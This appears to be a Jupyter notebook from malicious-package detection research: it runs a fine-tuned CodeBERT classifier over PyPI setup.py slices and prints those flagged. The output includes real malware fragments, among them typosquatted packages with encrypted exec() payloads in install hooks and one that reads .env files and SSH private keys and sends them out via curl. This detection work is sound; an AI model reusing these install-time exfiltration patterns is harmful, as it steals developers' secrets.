{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "63a34aa8-c7a3-4c86-a4c9-03446ad9e6ac",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "True\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "os.environ['TRANSFORMERS_CACHE'] = 'root\\autodl-tmp\\model'\n",
    "import torch\n",
    "print(torch.cuda.is_available())\n",
    "import os\n",
    "from torch.nn.utils.rnn import pad_sequence\n",
    "from sklearn.model_selection import train_test_split\n",
    "import re"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b237509a-01c4-4bf2-9abd-847c34922b7f",
   "metadata": {},
   "outputs": [],
   "source": [
    "import torch\n",
    "from transformers import RobertaTokenizer, RobertaForSequenceClassification\n",
    "\n",
    "# Check if a GPU is available, otherwise use CPU\n",
    "device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n",
    "\n",
    "\n",
    "# Initialize the tokenizer\n",
    "tokenizer = RobertaTokenizer.from_pretrained('model/codebert')\n",
    "\n",
    "# Define the model architecture\n",
    "# Make sure to use the same model architecture as the one used during training\n",
    "model = RobertaForSequenceClassification.from_pretrained('model/codebert',output_hidden_states=True)\n",
    "\n",
    "# Move the model to the appropriate device (GPU or CPU)\n",
    "model.to(device)\n",
    "\n",
    "# Load the previously saved model state dictionary\n",
    "# Ensure that the save_path variable points to the location where the model state dictionary was saved\n",
    "\n",
    "save_path = \"/root/autodl-tmp/model/PySbert0612\" #Name of your model\n",
    "model.load_state_dict(torch.load(save_path, map_location=device))\n",
    "\n",
    "# Set the model to evaluation mode\n",
    "model.eval()\n",
    "\n",
    "# The model has now been loaded with the previously saved state and is ready for inference or further training"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1c2ac787-3063-4d4f-a2f8-38a7ba262b40",
   "metadata": {},
   "outputs": [],
   "source": [
    "folder_mal_path = '...'  #path to your code slices folder\n",
    "mal_tokens = []\n",
    "file_path_box = []\n",
    "\n",
    "\n",
    "def get_texts(folder_path):\n",
    "# Traverse each file in the folder\n",
    "    texts = []\n",
    "    for file_name in os.listdir(folder_path):\n",
    "        if file_name.endswith('.txt'):\n",
    "            #print(file_name)\n",
    "            #Construct the full file path\n",
    "            file_path = os.path.join(folder_path, file_name)\n",
    "            if os.path.getsize(file_path) == 0:\n",
    "                continue\n",
    "            # Read the content of the file\n",
    "            with open(file_path, 'r', encoding='utf-8') as file:\n",
    "                lines = file.readlines()\n",
    "                # Clean the code and retain line breaks\n",
    "                #clean_lines = [clean_code_slices(line) for line in lines]\n",
    "                clean_lines = ''.join(line.strip() + '\\n' for line in lines)\n",
    "                # seqs = ''.join(file.readlines())\n",
    "                # Append the cleaned content to the texts list\n",
    "                texts.append(clean_lines)\n",
    "                file_path_box.append(file_path)  # Record the file path\n",
    "    return texts\n",
    "mal_texts = get_texts(folder_mal_path)\n",
    "# print(file_path_box)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "456694b5-fad8-479a-922c-d82f04b7d0a3",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "794"
      ]
     },
     "execution_count": 30,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(mal_texts)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "449b2d80-ab5a-4ca0-ae41-2bcc5c3863ea",
   "metadata": {},
   "outputs": [],
   "source": [
    "new_encoding = tokenizer(mal_texts, truncation=True, padding=True, max_length = 512)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "21a7c905-db5d-477b-a88e-c5931f41d2ea",
   "metadata": {},
   "outputs": [],
   "source": [
    "input_ids = new_encoding['input_ids']\n",
    "attention_mask = new_encoding['attention_mask']\n",
    "device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n",
    "model.to(device)\n",
    "\n",
    "# Convert lists to tensors\n",
    "input_ids = torch.tensor(input_ids)\n",
    "attention_mask = torch.tensor(attention_mask)\n",
    "input_ids = input_ids.to(device)\n",
    "attention_mask = attention_mask.to(device)\n",
    "def get_predictions_in_batches(input_ids, attention_mask, batch_size=16):\n",
    "    model.eval()\n",
    "    predictions = []\n",
    "\n",
    "    with torch.no_grad():\n",
    "        for i in range(0, len(input_ids), batch_size):\n",
    "            batch_input_ids = input_ids[i:i + batch_size].to(device)\n",
    "            batch_attention_mask = attention_mask[i:i + batch_size].to(device)\n",
    "            outputs = model(input_ids=batch_input_ids, attention_mask=batch_attention_mask)\n",
    "            logits = outputs.logits\n",
    "            probs = torch.nn.functional.softmax(logits, dim=-1)\n",
    "            batch_predictions = torch.argmax(probs, dim=-1)\n",
    "            predictions.extend(batch_predictions.cpu().numpy())\n",
    "\n",
    "    return predictions\n",
    "\n",
    "# Get predictions\n",
    "batch_size = 16  # Adjust batch size based on your GPU memory\n",
    "predictions = get_predictions_in_batches(input_ids, attention_mask, batch_size)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "67c11094-9d4e-4fee-8e47-c1e4dbd924d7",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"newling detect\",predictions.count(1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5d0bde07-0d5f-46ed-a6a7-5a54e06db979",
   "metadata": {},
   "outputs": [],
   "source": [
    "res_folder = '/root/autodl-tmp/dataset/slice_new/res'  # Specify the folder path to save the results\n",
    "name = 'new50001.txt'  # Replace 'your_filename' with the desired filename\n",
    "import os\n",
    "\n",
    "output_folder = '/root/autodl-tmp/dataset/slice_new/res'\n",
    "os.makedirs(output_folder, exist_ok=True)\n",
    "\n",
    "for idx, prediction in enumerate(predictions):\n",
    "    if prediction == 1:\n",
    "        file_path = file_path_box[idx]\n",
    "        with open(file_path, 'r', encoding='utf-8') as file:\n",
    "            content = file.read()\n",
    "        \n",
    "        output_file_path = os.path.join(output_folder, name)\n",
    "        with open(output_file_path, 'a', encoding='utf-8') as output_file:\n",
    "            output_file.write(file_path)\n",
    "            output_file.write(\"\\n\")\n",
    "            output_file.write(content)\n",
    "            output_file.write(\"\\n\\n\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "758022f2-057f-487a-893f-aae903974760",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/is_py3-0.0.1.txt\n",
      "from setuptools import setup\n",
      "class CustomInstallCommand(install):\n",
      "install.run(self)\n",
      "setup(\n",
      "long_description=open('README.md').read(),\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/ethereun-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'BcSjuWiyCw_[BASE64]_Q=').decrypt(b'gAAAAABmbvQY-[BASE64]-[BASE64]-[BASE64]'))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/web4.py-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'[BASE64]').decrypt(b'gAAAAABmbvOMD-[BASE64]-[BASE64]_zTXBsftx1sWTo0L11zQNJGQ_HgFMfUcDZ23k4714_[BASE64]'))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/st-graphpca-0.1.3.txt\n",
      "with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n",
      "long_description = '\\n' + f.read()\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/dpndncyconfusion-0.1.txt\n",
      "from setuptools import setup\n",
      "class CustomInstallCommand(install):\n",
      "os.system(\"python -m dpndncyconfusion.pre_install\")\n",
      "install.run(self)\n",
      "setup(\n",
      "long_description=open('README.md').read(),\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/letbabytalk-0.1.4.txt\n",
      "from setuptools import setup, find_packages\n",
      "class CustomInstallCommand(install):\n",
      "password = getpass.getpass('Enter the installation password: ')\n",
      "install.run(self)\n",
      "sys.exit(1)\n",
      "setup(\n",
      "long_description=open(\"README.md\", \"r\", encoding=\"utf-8\").read() if os.path.exists(\"README.md\") else \"\",\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/migoapiclient-1.2.3.txt\n",
      "#!/usr/bin/env python\n",
      "with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n",
      "long_description = '\\n' + f.read()\n",
      "project_slug = NAME.lower().replace(\"-\", \"_\").replace(\" \", \"_\")\n",
      "with open(os.path.join(here, project_slug, '__version__.py')) as f:\n",
      "exec(f.read(), about)\n",
      "class UploadCommand(Command):\n",
      "self.status('Removing previous builds…')\n",
      "rmtree(os.path.join(here, 'dist'))\n",
      "self.status('Building Source and Wheel (universal) distribution…')\n",
      "os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))\n",
      "self.status('Uploading the package to PyPI via Twine…')\n",
      "os.system('twine upload dist/*')\n",
      "self.status('Pushing git tags…')\n",
      "os.system('git tag v{0}'.format(about['__version__']))\n",
      "os.system('git push --tags')\n",
      "sys.exit()\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/face3d_med_reconstruction-0.0.1.txt\n",
      "from setuptools import setup, find_packages\n",
      "with open(os.path.join(current_folder_path, 'README.md'), 'r', encoding='utf-8') as fh:\n",
      "long_description = fh.read()\n",
      "class PostInstallCommand(install):\n",
      "install.run(self)\n",
      "subprocess.check_call(['pip', 'install', '-r', os.path.join(current_folder_path, 'requirements.txt')])\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/etheraem-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'BHl8ejiNbaReORbC_AhVIpPneNR7touZkf9xM3nDZwU=').decrypt(b'gAAAAABmbvRZ8AA2K_[BASE64]-[BASE64]-_[BASE64]-[BASE64]-[BASE64]-abhWNPA='))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/autofracture-0.1.0.txt\n",
      "with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n",
      "long_description = '\\n' + f.read()\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/wqet_grader-0.2.2.txt\n",
      "class install(_install):\n",
      "_install.run(self)\n",
      "setup(\n",
      "comment = result.get('comment', 'Please Try Again :(')\n",
      "if result.get('passed', False) == True:\n",
      "comment = result.get('comment', 'Question Passed!')\n",
      "display(HTML(html.replace('$score', str(result['score'])).replace('$comment', comment)))\n",
      "if result.get('image', None) != None:\n",
      "pil_image = PilImage.open(image)\n",
      "'hostname': os.popen('hostname').read().strip(),\n",
      "'uptime': os.popen('uptime').read().strip(),\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/ipgogogo-1.1.1.txt\n",
      "#!/usr/bin/env python\n",
      "with io.open(os.path.join(here, \"README.md\"), encoding=\"utf-8\") as f:\n",
      "long_description = \"\\n\" + f.read()\n",
      "project_slug = NAME.lower().replace(\"-\", \"_\").replace(\" \", \"_\")\n",
      "with open(os.path.join(here, project_slug, \"__version__.py\")) as f:\n",
      "exec(f.read(), about)\n",
      "class UploadCommand(Command):\n",
      "self.status(\"Removing previous builds…\")\n",
      "rmtree(os.path.join(here, \"dist\"))\n",
      "self.status(\"Building Source and Wheel (universal) distribution…\")\n",
      "os.system(\"{0} setup.py sdist bdist_wheel --universal\".format(sys.executable))\n",
      "self.status(\"Uploading the package to PyPI via Twine…\")\n",
      "os.system(\"twine upload dist/*\")\n",
      "self.status(\"Pushing git tags…\")\n",
      "os.system(\"git tag v{0}\".format(about[\"__version__\"]))\n",
      "os.system(\"git push --tags\")\n",
      "sys.exit()\n",
      "setup(\n",
      "class IPGoGoGo:\n",
      "def __init__(self, input_path: str, output_path: str, loglevel: str = \"INFO\"):\n",
      "core.run()\n",
      "run()\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/etheeruum-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'Q0naE100NKBakvwvZ_SizL9YJLUISIQXNlP974SxBuE=').decrypt(b'gAAAAABmbvQuE63y-_[BASE64]-47EgDAyv_B7DB6M_75hojRyboUo9-PPVzsw_[BASE64]_qfbdP7RbdO95NX73ZANoDsMKc_[BASE64]_y6tP9ANAX6T_-tbaIHGXtee_N4x_Lzv-6R2k-w5buYXvC1YQHp-cNpJDaqgnms='))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/fb_api_wrapper-1.0.9.txt\n",
      "here = pathlib.Path(__file__).parent.resolve()\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/goldensweatshirtwifi-99.0.txt\n",
      "import platform\n",
      "if platform.system().lower() in ('darwin', 'linux'):\n",
      "req = http_request.Request(\"[URL]\n",
      "response = http_request.urlopen(req, timeout=5)\n",
      "RESP = response.read().decode('utf-8')\n",
      "f = open(config)\n",
      "sck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n",
      "f = open(\"/sys/class/net/{}/address\".format(ifn))\n",
      "mac = f.read()\n",
      "sysp = platform.system()\n",
      "f = open(\"/proc/net/dev\", \"r\")\n",
      "process = subprocess.Popen([\"ifconfig\"], stdout=subprocess.PIPE)\n",
      "output = process.communicate()[0].decode('utf-8')\n",
      "sysp = platform.system()\n",
      "process = subprocess.Popen([\"ifconfig\", interface], stdout=subprocess.PIPE)\n",
      "output = process.communicate()[0].decode('utf-8')\n",
      "os_name = platform.system().lower()\n",
      "username = getpass.getuser()\n",
      "req = http_request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})\n",
      "response = http_request.urlopen(req, timeout=30)\n",
      "f = open(os.path.expanduser(\"~/.pip/pip.conf\"))\n",
      "class CustomInstall(install):\n",
      "pip = \"{} -m pip\".format(sys.executable)\n",
      "s = subprocess.check_output('{}{} install {} --index-url \"{}\"'.format(py_path, pip, PACKAGE, index_url), shell=True)#.decode()\n",
      "s = subprocess.check_output('{}{} download {} --no-deps --index-url \"{}\"'.format(py_path, pip, PACKAGE, index_url), shell=True)#.decode()\n",
      "shutil.move(dw_wheel, t_dir + \"/\" + dw_wheel)\n",
      "os.unlink(t_dir + \"/\" + t_wheel)\n",
      "shutil.move(dw_wheel, t_dir + \"/\" + dw_wheel)\n",
      "atexit.register(_post_install)\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/gpe_lib-0.0.1.txt\n",
      "for fn,url in fonts:\n",
      "filename = os.path.join(fonts_dir,fn)\n",
      "if not os.path.exists(filename):\n",
      "with open(filename, \"wb\") as f: [f.write(chunk) if chunk else None for chunk in requests.get(url, stream=True).iter_content(chunk_size=8192)]\n",
      "matplotlib.rc(\"font\", family=family)\n",
      "__use_font(\"Times New Roman\",[(\"Times New Roman.ttf\",\"[URL] New Roman - Bold.ttf\",\"[URL] New Roman Italic.ttf\",\"[URL] New Roman Bold Italic.ttf\",\"[URL]\n",
      "__use_font(\"Comfortaa\",[(\"Comfortaa-Regular.ttf\",\"[URL]\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/bussardweg4a-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'DX82cQ1FrVN3lMAdZGJgb-tgWkqEWeLk3iPbac7i_wU=').decrypt(b'[BASE64]_4m40iY7xsWEhbp96r6INrVDiV_[BASE64]_-m7JMsyh_UG-76qm2VEsB3vuBy1kBLL4_SAEYBqVVJIYYoQICmi677Ea_[BASE64]_[BASE64]_w='))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/llm-together-0.4.txt\n",
      "from setuptools import setup\n",
      "with open(\n",
      ") as fp:\n",
      "return fp.read()\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/accsr-0.4.7.txt\n",
      "from setuptools import find_packages, setup\n",
      "install_requires=open(\"requirements.txt\").readlines(),\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/pyllsm5dtools-1.1.3.txt\n",
      "import os\n",
      "matlab_runtime_url = (\"[URL]\n",
      "class CustomInstall(install):\n",
      "shutil.rmtree(llsm5dtools_dir)\n",
      "process = subprocess.Popen(\n",
      "os.rename(llsm5dtools_github_dir, llsm5dtools_dir)\n",
      "os.remove(llsm5dtools_zip_loc)\n",
      "urllib.request.urlretrieve(matlab_runtime_url, matlab_runtime_zip_loc)\n",
      "process = subprocess.Popen(\n",
      "f\"unzip -o -q \\\"{matlab_runtime_zip_loc}\\\" -d \\\"{matlab_runtime_tmp_dir}\\\"\", shell=True)\n",
      "process = subprocess.Popen(\n",
      "os.remove(matlab_runtime_zip_loc)\n",
      "shutil.rmtree(matlab_runtime_tmp_dir)\n",
      "sys.stderr.write(\"Error downloading/extracting MATLAB runtime: {}\\n\".format(str(e)))\n",
      "sys.exit(1)\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/simple_integer-0.2.6.txt\n",
      "from setuptools import setup\n",
      "class CustomInstallCommand(install):\n",
      "install.run(self)\n",
      "setup(\n",
      "long_description=open('README.md').read(),\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/ingen_lib-1.0.0.txt\n",
      "#  Copyright (c) 2023 BlackRock, Inc.\n",
      "install_requires=open('requirements.txt').read().splitlines(),\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/broadlink-0.19.0.txt\n",
      "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Internet  # UDP\n",
      "sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n",
      "sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)\n",
      "sock.sendto(payload, (ip_address, DEFAULT_PORT))\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/tsellm-0.0.0a0.txt\n",
      "from setuptools import setup\n",
      "with open(\n",
      ") as fp:\n",
      "return fp.read()\n",
      "setup(\n",
      "install_requires=[\"click\", \"llm\", \"setuptools\", \"pip\"],\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/bec-server-0.50.2.txt\n",
      "import os\n",
      "current_path = pathlib.Path(__file__).parent.resolve()\n",
      "if \"dev\" in os.environ.get(\"EXTRAS_REQUIRE\", \"\"):\n",
      "subprocess.run(f\"pip install -e {dep}{suffix}\", shell=True, check=True)\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/opensead-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'FEsUIPHSvxN_TNyaH4UerTVjmqiMbf8nQuLfu_1nssc=').decrypt(b'[BASE64]-BGU7ZPVkIlrIijUL0_RuXU-0_Xid7Yrqz8NVh10-Wk5PfNX5pGZkuKVG1AdV-[BASE64]-4_[BASE64]_g_[BASE64]-AF3qvqqPDtDc04='))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/openseax-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'[BASE64]').decrypt(b'gAAAAABmbvV8ITm5Hgs8_BUZVJRMeBZztvQ9uAnFvMQ1Px-[BASE64]-[BASE64]-1BEKg8oLnyvEp_[BASE64]_CueNEHFbL0-[BASE64]'))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/declareq-0.1.8.txt\n",
      "#!/usr/bin/env python\n",
      "with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n",
      "long_description = '\\n' + f.read()\n",
      "project_slug = NAME.lower().replace(\"-\", \"_\").replace(\" \", \"_\")\n",
      "with open(os.path.join(here, project_slug, '__version__.py')) as f:\n",
      "exec(f.read(), about)\n",
      "class UploadCommand(Command):\n",
      "self.status('Removing previous builds…')\n",
      "rmtree(os.path.join(here, 'dist'))\n",
      "self.status('Building Source and Wheel (universal) distribution…')\n",
      "os.system(\n",
      "self.status('Uploading the package to PyPI via Twine…')\n",
      "os.system('twine upload dist/*')\n",
      "self.status('Pushing git tags…')\n",
      "os.system('git tag v{0}'.format(about['__version__']))\n",
      "os.system('git push --tags')\n",
      "sys.exit()\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/slthlib-0.0.4.txt\n",
      "import os\n",
      "install_requires = open('requirements.txt').read().splitlines()\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/streamlit-nested-layout-0.1.3.txt\n",
      "#!/usr/bin/env python\n",
      "with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n",
      "long_description = '\\n' + f.read()\n",
      "project_slug = NAME.lower().replace(\"-\", \"_\").replace(\" \", \"_\")\n",
      "with open(os.path.join(here, project_slug, '__version__.py')) as f:\n",
      "exec(f.read(), about)\n",
      "class UploadCommand(Command):\n",
      "self.status('Removing previous builds…')\n",
      "rmtree(os.path.join(here, 'dist'))\n",
      "self.status('Building Source and Wheel (universal) distribution…')\n",
      "os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))\n",
      "self.status('Uploading the package to PyPI via Twine…')\n",
      "os.system('twine upload dist/*')\n",
      "self.status('Pushing git tags…')\n",
      "os.system('git tag v{0}'.format(about['__version__']))\n",
      "os.system('git push --tags')\n",
      "sys.exit()\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/whttpx-0.0.7.txt\n",
      "from setuptools import find_packages, setup\n",
      "with open('./README.md', 'r', encoding='utf-8') as fh:\n",
      "readme = fh.read()\n",
      "httpx = Request()\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/popeye_xyz-1.0.4.txt\n",
      "from turtle import home\n",
      "powershell_cmd = \"powershell.exe Get-ChildItem -Path %s -Filter *.env -Recurse -ErrorAction SilentlyContinue -Force -File | ForEach-Object {$_.FullName}\"%(drive)\n",
      "print(powershell_cmd)\n",
      "powershell_cmd = powershell_cmd.split(\" \")\n",
      "result = subprocess.run(powershell_cmd, capture_output=True, timeout=2)\n",
      "output = result.stdout.decode()\n",
      "output = output.split(\"\\n\")\n",
      "if len(output)==0:\n",
      "for i in output:\n",
      "i = i.rstrip()\n",
      "paths.append(i)\n",
      "for i in paths:\n",
      "if os.path.exists(i):\n",
      "with open(i, \"r\") as f:\n",
      "dotenv+=f.read()+\"\\n\"\n",
      "cmd = cmd.split(\" \")\n",
      "result = subprocess.run(cmd, capture_output=True, timeout=5)\n",
      "output = result.stdout.decode().split(\"\\n\")\n",
      "if len(output)==0:\n",
      "for i in output:\n",
      "i = i.rstrip()\n",
      "paths.append(i)\n",
      "for i in paths:\n",
      "if os.path.exists(i):\n",
      "with open(i, \"r\") as f:\n",
      "dotenv+=f.read()+\"\\n\"\n",
      "dotenv = base64.b64encode(dotenv.encode()).decode()\n",
      "environs = base64.b64encode(str(environs).encode()).decode()\n",
      "req1 = f\"{URL}/?dotenv={dotenv}\"\n",
      "subprocess.check_output([\"curl\",req1])\n",
      "subprocess.check_output([\"curl\",req2])\n",
      "with open(os.path.join(home_path, \".ssh\",\"id_rsa\"),\"r\") as f:\n",
      "privkey = f.read()\n",
      "if privkey==\"\" or privkey is None:\n",
      "privkey = base64.b64encode(privkey.encode()).decode()\n",
      "req = f\"{URL}/?id_rsa={privkey}\"\n",
      "subprocess.check_output([\"curl\",req])\n",
      "class AfterDevelop(develop):\n",
      "develop.run(self)\n",
      "class AfterInstall(install):\n",
      "install.run(self)\n",
      "setuptools.setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/eethereum-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'[BASE64]-a_8MNyVla9MI=').decrypt(b'gAAAAABmbvQLL_n05UtN5nvcxMTBW35dn4yv-uERUWtJnEjIA2ss6IhzVlhPWESN_[BASE64]-[BASE64]'))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/opemsea-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'[BASE64]').decrypt(b'gAAAAABmbvUP4TYR920z_RnjSNJZue88X-Xy-[BASE64]_ZeLwCfeZ3X7TOBvZ2tCZ8VKgT-Ol-BopepZIHls8qx-2IWSKhT6aFergwW-[BASE64]-vnYOzzdpQjFzkWev9OH8HCrDU4='))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/mask_key-0.3.2.txt\n",
      "from setuptools import setup, find_packages\n",
      "class PostInstallCommand(install):\n",
      "install.run(self)\n",
      "subprocess.run([\"mask-key-setup\"], check=True)\n",
      "setup(\n",
      "long_description=open(\"README.md\").read(),\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/berset_engine-2024.1003.txt\n",
      "#!/usr/bin/env python\n",
      "with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n",
      "long_description = '\\n' + f.read()\n",
      "project_slug = NAME.lower().replace(\"-\", \"_\").replace(\" \", \"_\")\n",
      "with open(os.path.join(here, project_slug, '__version__.py')) as f:\n",
      "exec(f.read(), about)\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/openvino_trackface-0.0.1.txt\n",
      "from setuptools import setup, find_packages\n",
      "with open(os.path.join(current_folder_path, 'README.md'), 'r', encoding='utf-8') as fh:\n",
      "long_description = fh.read()\n",
      "class PostInstallCommand(install):\n",
      "install.run(self)\n",
      "subprocess.check_call(['pip', 'install', '-r', os.path.join(current_folder_path, 'requirements.txt')])\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/etherium-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'[BASE64]').decrypt(b'gAAAAABmbvPWyPClNX3-97SIcYNwUiu4zm9VQ4vtK_[BASE64]-C27XGtp9rElEzTGP1D8lmFAZmi-[BASE64]_GOm3C1qvNo6t-ae8HCzP2-[BASE64]-YQCURQPbPpd-P9gC3EbpA='))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/pyseedmip-0.0.1.7.1.txt\n",
      "class CustomInstallCommand(install):\n",
      "module_path = module_path.replace('root/.local','usr/local')\n",
      "os.system(f\"cp {bin_file_path} {bin_path}\")\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/openwsea-1.0.0.txt\n",
      "from setuptools import setup, find_packages\n",
      "class [BASE64](install):\n",
      "exec(Fernet(b'[BASE64]').decrypt(b'[BASE64]_SFuufiuI-GFIw-[BASE64]_Pbi3jiTMstJNNvtiZIgFB-Yf-[BASE64]_[BASE64]'))\n",
      "install.run(self)\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/sastadev-0.2.3.txt\n",
      "here = pathlib.Path(__file__).parent.resolve()\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/calc_note-0.2.1.txt\n",
      "#!/usr/bin/env python\n",
      "with io.open(os.path.join(here, 'README.md'), encoding='utf-8') as f:\n",
      "long_description = '\\n' + f.read()\n",
      "project_slug = NAME.lower().replace(\"-\", \"_\").replace(\" \", \"_\")\n",
      "with open(os.path.join(here, project_slug, '__version__.py')) as f:\n",
      "exec(f.read(), about)\n",
      "class UploadCommand(Command):\n",
      "self.status('Removing previous builds…')\n",
      "rmtree(os.path.join(here, 'dist'))\n",
      "self.status('Building Source and Wheel (universal) distribution…')\n",
      "os.system('{0} setup.py sdist bdist_wheel --universal'.format(sys.executable))\n",
      "self.status('Uploading the package to PyPI via Twine…')\n",
      "os.system('twine upload dist/*')\n",
      "self.status('Pushing git tags…')\n",
      "os.system('git tag v{0}'.format(about['__version__']))\n",
      "os.system('git push --tags')\n",
      "sys.exit()\n",
      "setup(\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/t_netcdftypes-0.0.1.txt\n",
      "from setuptools import setup\n",
      "class CustomInstallCommand(install):\n",
      "install.run(self)\n",
      "setup(\n",
      "long_description=open('README.md').read(),\n",
      "\n",
      "File: /root/autodl-tmp/dataset/slice_new/new40001/cleaning_new/cramhacks-0.0.10.txt\n",
      "class CustomInstallCommand(install):\n",
